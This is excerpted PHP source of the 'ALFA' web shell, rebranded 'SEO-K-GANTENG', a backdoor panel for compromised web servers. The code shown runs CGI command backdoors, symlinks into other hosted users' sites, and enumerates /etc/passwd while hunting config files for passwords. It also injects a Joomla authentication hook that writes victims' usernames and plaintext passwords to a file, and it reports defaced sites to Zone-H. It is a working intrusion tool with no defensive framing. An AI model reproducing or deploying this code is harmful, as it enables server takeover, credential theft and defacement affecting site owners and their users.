...
define("__SEO-K-GANTENG_FOLDER__", "SEO-K-GANTENG");
...
$GLOBALS['__ALFA_COLOR__'] = array(
		...
		"main_size" => "#03a336",
		"main_modify" => "#03a336",
		"main_owner_group" => "#03a336",
		"main_green_perm" => "#25ff00",
		"main_red_perm" => "#FF0000",
		"main_white_perm" => "#996d75",
		"beetween_perms" => "#996d75",
		"main_actions" => array(
			"key_color" => "#996d75",
			"multi_selector" => array(
...
<center><img style="border-radius:100px;" width="500" height="250" alt="alfa team 2012" draggable="false" src="https://siap.kopertais1.or.id/assets/layouts/layout3/img/lb-back.jpg" /></center>
...
function _alfa_cgicmd($cmd,$lang="perl",$set_cookie=false){
	...
	if($is_curl||$is_socket){
		...
		$cgi_url = __SEO-K-GANTENG_FOLDER__."/alfacgiapi/".$lang.$cgi_ext;
...
echo "PWD:<font color=#996d75> " . str_replace("\\","/",@alfaGetCwd()) . "/<br />";
...
<td width="12%" rowspan="8"><img style="border-radius:100px;" width="300" height="170" alt="alfa team 2012" draggable="false" src="https://siap.kopertais1.or.id/assets/layouts/layout3/img/lb-back.jpg" /></td>
</tr>
<tr>
...
echo '';
echo '<table border="1"><tbody><tr><td><div class="tbltxt" style="color:#996d75">Protect:</div></td><td><select name="protect" style="width:100%;">'.$protect_html.'</select></td></tr><tr><td><div class="tbltxt" style="color:#996d75">Cgi Api:</div></td><td><select name="cgi_api" style="width:100%;">'.$cgiapi_html.'</select></td></tr><tr><td><div class="tbltxt" style="color:#996d75">Post Encryption:</div></td><td><select name="post_encrypt" style="width:100%;">'.$postEnc_html.'</select></td></tr><tr><td><div class="tbltxt" style="color:#996d75">Show Icons:</div></td><td><select name="icon" style="width:100%;">'.$icon_html.'</select></td></tr><tr><tr><td><div class="tbltxt" style="color:#996d75">login Page:</div></td><td><select style="width:100%;" name="lgpage">'.$login_html.'</select></td></tr><tr><td><div class="tbltxt" style="color:#996d75">UserName:</div></td><td><input type="text" style="width:95%;" name="username" value="'.(empty($_POST['alfa3'])?$GLOBALS['DB_NAME']['user']:$_POST['alfa3']).'" placeholder="solevisible"></td></tr><tr><td><div class="tbltxt" style="color:#996d75">Password:</div></td><td><input type="text" style="width:95%;" name="password" placeholder="*****"></td></tr></tbody></table><input type="hidden" name="e" value="'.$GLOBALS['DB_NAME']['safemode'].'"><input type="hidden" name="s" value="'.$GLOBALS['DB_NAME']['show_icons'].'"><p><input type="submit" name="btn" value=" "></p></form></center>';
if($_POST['alfa5']=='>>'){
echo __pre();
...
$template = '<tr><td style="text-align:center;"><a href="http://solevisible.com/customcolors/{help}.png" target="_blank"><font color="#d40f67">Help</font></a></td><td style="text-align:center;"><div class="tbltxt">{index}</div></td><td><div class="tbltxt" style="margin-left:5px;">{target}:</div></td><td><input style="width:60px;" multi="{multi}" id="gui_{target}" onChange="colorHandler(this);" target=".{target}" type="color" value="{color}"></td><td><input type="text" style="text-align:center;" multi="{multi}" onkeyup="colorHandlerKey(this);" target=".{target}" id="input_{target}" class="colors_input" placeholder="#996d75" value="{color}"></td></tr>';
$x = 1;
foreach($GLOBALS['__ALFA_COLOR__'] as $key => $value){
	$multi = "";
	if(is_array($value)){
...
if($_POST['alfa7']=='export'){
	...
	if(!@file_put_contents($file, $config)){
		...
		echo('<h3><p><center><a class="actions" href="javascript:void(0);" onclick="g(\'FilesTools\',null,\''.$file.'\', \'download\')"><font color="#a60776">Download Config</font></a></center></p></h3>');
	}
}
if($_POST['alfa2']=='>>'){
	echo __pre();
...
if(empty($about_us)){
$about_us = "<pre><center><img src='http://asset-1.tstatic.net/img/logo/tribun/svg/tribunnews.svg'><br>
<b><font size='+3' color='#4d13d4'>&#9774; ~ PEACE ~ &#9774;</font><br><b>
<font color='#4d13d4'>Shell Coded By Sole Sad & Invisible (SEO K)</font><br>
<font color='#4d13d4'>Contact : solevisible@gmail.com</font><br>
<font color='#4d13d4'>Telegram Channel: @Bypasuser</font><br>
<font color='#996d75'>Skype : ehsan.invisible</font><br>
<font color='#996d75'>Skype : sole.sad</font><br>
...
if(count($selected_data) > 0){
	if($db){
		...
		echo __pre();
		echo "<center><font color='#d40f67'>".$tbls."</font></center>";
	}
}
...
if($db){
	...
	foreach($data as $tbl => $cols){
	    echo '<li><span style="color:#d40f67;" class="box">'.$tbl.' ('.$cols["data_count"].')</span><ul class="nested">';
	    foreach($cols["cols"] as $col){
	        echo '<li tbl="'.$tbl.'"><span style="color:#d40f67;" tbl="'.$tbl.'" class="box sub-box">' . $col . '</span></li>';
	    }
	    echo '</ul></li>';
	}
	echo '</ul>';
...
output($ff);}else{
echo "<br><pre id=\"strOutput\" style=\"margin-top:5px\" class=\"ml1\"><br><center><b><font color=\"#996d75\">Please go to Target => </font><a href='".$path."/pwreset.php' target='_blank'>".$path."/pwreset.php</a><br/><font color='#996d75'> And Reset Password With Email</font> => <font color=red>solevisible@fbi.gov</font><br/><font color='#996d75'>And Go To => </font><a href='".$path."/solevisible.php' target='_blank'>".$path."/solevisible.php</a></b></center><br><br>";}}else{__alert('Path is not Valid...');}}}
...
echo "<br><pre id='strOutput' style='margin-top:5px' class='ml1'><br><center><b><font color='#996d75'>Please Go To Target => </font><a href='".$ff."' target='_blank'>".$ff."</a><br/><font color='#996d75'>And Go To => </font><a href='".$fff."' target='_blank'>".$fff."</a></b></center><br><br>";
}}}}
...
$fff = 'http://'.$realurl.$realpath."/solevisible.php";
echo "<center><p><font color=\"#996d75\">First Open This Link => </font><a href='".$ff."' target='_blank'>".$ff."</a><br/><font color=\"#996d75\">Second Open This Link => </font><a href='".$fff."' target='_blank'>".$fff."</a></center></p>";}}}
echo '</div>';
alfafooter();
}
...
function alfaWriteTocgiapi($name, $source){
	...
	if(in_array($name, $not_api)){
		...
		@chdir($GLOBALS['home_cwd'] . "/" . __SEO-K-GANTENG_FOLDER__);
	}
...
switch($resp){
	...
	case('CODE ERREUR : 005'):echo "<b><font color='red'>The hash you provide doesn't seem to match with the type ofhash you set.</font></b>";break;
}
...
echo '<font color="#996d75"><b>Can\'t set permissions!</b></font><br><script>document.mf.alfa3.value="";</script>';}
}else{echo('Success!');}
}
clearstatcache();
...
echo "<br><pre id=\"strOutput\" style=\"margin-top:5px\" class=\"ml1\"><br><center><b><font color=\"#996d75\">Please go to Target </font><font color=red>\" ".$path."/pwreset.php \"</font><br/><font color=\"#996d75\"> and reset password with email</font> => <font color=red>solevisible@fbi.gov</font><br/><font color=\"#996d75\">and go to</font> <font color=red>\" ".$path."/".$fname." \"</font></b></center><br><br>";
}}}}
...
echo __pre()."<center><table border='1'><tr><td><b><font color=\"#996d75\">User: </b></font></td><td><b><font color=\"#FF0000\">{$user}</font></b></td></tr><tr><td><b><font color=\"#996d75\">site: </b></font></td><td><b><font color=\"#FF0000\">{$rep}</font></b></td></tr></table></center>";
...
<tr><td><b><font color=\"#996d75\">User: </b></font></td><td><b><font color=\"#FF0000\">".trim($ex[1])."</font></b></td></tr>
<tr><td><b><font color=\"#996d75\">site: </b></font></td><td><b><font color=\"#FF0000\">{$rep}</font></b></td></tr></table></center>";break;}}}}}
...
echo __pre()."<center><font color =\"#4d13d4\"><b>[+] Sending Sites To Zone-H Has Been Completed Successfully !!![+]</b><font></center>";
}
echo "</div>";
alfafooter();
}
...
function alfaCreateParentFolder(){
	$parent = $GLOBALS['home_cwd'] . "/" . __SEO-K-GANTENG_FOLDER__;
	if(!@is_dir($parent)){
...
echo __pre();
echo '<center><b><font color="white">Click >> </font><a target="_blank" href="'.__SEO-K-GANTENG_FOLDER__."/".$sym_dir.'" ><b><font size="4">'.$symname.'</font></b></a></b></center>';
}
}else{echo "<center><pre class=ml1 style='margin-top:5px'><b><font color=\"#996d75\">[+] Symlink Function Disabled !</b></font></pre></center>";}
}
...
$table_header = "<pre id=\"strOutput\" style=\"margin-top:5px\" class=\"ml1\"><br><table id='tbl_sympphp' align='center' width='40%' class='main' border='1'><td><span style='color:#06ba21;'><b>*</span></b></td><td><span style='color:#4d13d4;'><b>Domains</span></b></td><td><span style='color:#996d75;'><b>Users</span></b></td><td><span style='color:#FF0000;'><b>symlink</span></b></td>";
...
echo $table_header;
$count=1;
$template = '<tr><td><span style="color:#06ba21;">{count}</span></td><td style="text-align:left;"><a target="_blank" href="{http}"/><span style="color:#4d13d4;margin-left:10px;"><b>{domain}</b> </a></span></td><td style="text-align:left;"><span style="color:#996d75;margin-left:10px;"><b>{owner}</font></b></td><td><a href="'.__SEO-K-GANTENG_FOLDER__.'/alfasymlink/root{sympath}" target="_blank"><span style="color:#FF0000;">Symlink</span></a></td></tr>';
...
$count=1;
echo $table_header;
$template = '<tr><td><span style="color:#06ba21;">{count}</span></td><td style="text-align:left;"><a target="_blank" href="http://www.{url}"/><span style="color:#4d13d4;margin-left:10px;"><b>{url}</b> </a></span></td><td style="text-align:left;"><span style="color:#996d75;margin-left:10px;"><b>{user}</font></b></td><td><a href="'.__SEO-K-GANTENG_FOLDER__.'/alfasymlink/root{cwd}" target="_blank"><span style="color:#FF0000;">Symlink</span></a></td></tr>';
if($sole){
...
$cant_symlink = false;
	...
	echo "<pre class=ml1 style='margin-top:5px'><b><font color=\"#996d75\">[+] Symlink Function Disabled !</b></font></pre></center>";
	$cant_symlink = false;
}
if($cant_symlink)echo '<pre id="strOutput" style="margin-top:5px" class="ml1"><br><font color="#996d75">Error...</font></b><br>';
echo "</center></table>";
}
echo "</div>";
alfafooter();
...
echo "<div class=header>";
echo "
<center><p><img src=\"http://asset-1.tstatic.net/img/logo/tribun/svg/tribunnews.svg\"></p>";
...
@chmod($name,0755);
echo '<iframe src="'.__SEO-K-GANTENG_FOLDER__.'/cgialfa/'.$name.'" width="100%" height="600px" frameborder="0" style="opacity:0.9;filter: alpha(opacity=9);overflow:auto;"></iframe>';
}
}
echo $div;
alfafooter();
...
echo("<tr><td><b><font color=\"#996d75\">Type</font></td><td>$type</td></tr></b>");
echo("<tr><td><b><font color=\"#996d75\">Active</font></td><td>$active</td></tr></b>");
echo("<tr><td><b><font color=\"#996d75\">Hostname</font></td><td>$hostname</td></tr></b>");
echo("<tr><td><b><font color=\"#996d75\">Ip</font></td><td>$ipaddress</td></tr></b>");
echo("<tr><td><b><font color=\"#996d75\">Username</font></td><td>$username</td></tr></b>");
echo("<tr><td><b><font color=\"#996d75\">Password</font></td><td>$password</td></tr></b>");
...
echo("<center><table border='1'>");
echo("<tr><td><b><font color=\"#03a336\">Register</font></td><td>$registrar</td></tr></b>");
echo("<tr><td><b><font color=\"#03a336\">Setting</font></td><td>$setting</td></tr></b>");
echo("<tr><td><b><font color=\"#03a336\">Value</font></td><td>$value</td></tr></b>");
echo "</table><br><br></center>";
}
}
...
echo '<br><br>';
echo "<b><font color=\"#4d13d4\">[+] Founded ".sizeof($passwd)." entrys in /etc/passwd\n"."<br /></font></b>";
echo "<b><font color=\"#996d75\">[+] Founded ".$x." readable ".str_replace("{user}", "*", $makepwd)." directories\n"."<br /></font></b>";
echo "<b><font color=\"#FF0000\">[~] Searching forpasswords in config files...\n\n"."<br /><br /><br /></font></b>";
foreach($users as $user){
if(empty($user))continue;
$path = str_replace("{user}", $user, $makepwd);
echo "<form method=post onsubmit='g(\"FilesMan\",this.c.value,\"\");return false;'><span><font color=#27979B>Change Dir <font color=#06ba21>..:: </font><font color=red><b>$user</b></font><font color=#06ba21> ::..</font></font></span><br><input class='foottable' type=text name=c value='$path'><input type=submit value='>>'></form><br>";
}
}else{echo('<b> <center><font color="#996d75">[-] Error : coudn`t read /etc/passwd [-]</font></center></b>');}
echo '<br><br></b>';
echo '</div>';
alfafooter();
}
...
echo __pre().'<center><p>Done -> <b><font color="green">'.$zipfile.'</font></b></p></center>';
}elseif($GLOBALS['sys']=='unix'&&!empty($file_type)&&_alfa_can_runCommand(true,true)&&(strlen(alfaEx('which unzip')) > 0||strlen(alfaEx('which tar')) > 0||strlen(alfaEx('which gunzip')) > 0)){switch ($file_type) {
...
$code = '<?php jimport(\'joomla.user.authentication\');$Alfa_auth = & JAuthentication::getInstance();$SEO-K-GANTENG = array(\'username\'=>$_POST[\'username\'],\'password\'=>$_POST[\'passwd\']);$Alfa_options = array();$Alfa_response = $Alfa_auth->authenticate($SEO-K-GANTENG, $Alfa_options);if($Alfa_response->status == 1){$alfa_file="{saveto_path}";$fp=@fopen($alfa_file,"a+");@fwrite($fp, $Alfa_response->username.":".$_POST[\'passwd\']." ( ".$Alfa_response->email." )\n");@fclose($fp);$f = @file($alfa_file);$new = array_unique($f);$fp = @fopen($alfa_file, "w");foreach($new as $values){@fputs($fp, $values);}@fclose($fp);}?>';
$code=str_replace('{saveto_path}',$saveto,$code);
...
echo '<center><div class="txtfont_header">| Find Readable Or WritableFiles  |</div><br><br><form name="srch" onSubmit="g(\'searcher\',null,\'file\',this.filename.value,this.ext.value,this.method.value,\'>>\');return false;" method=\'post\'>
<div class="txtfont">
...
return('<iframe src="'.__SEO-K-GANTENG_FOLDER__."/".$f.'" width="'.$width.'" height="'.$height.'" frameborder="0"></iframe>');
}
class AlfaCURL {
public $headers;
public $user_agent;
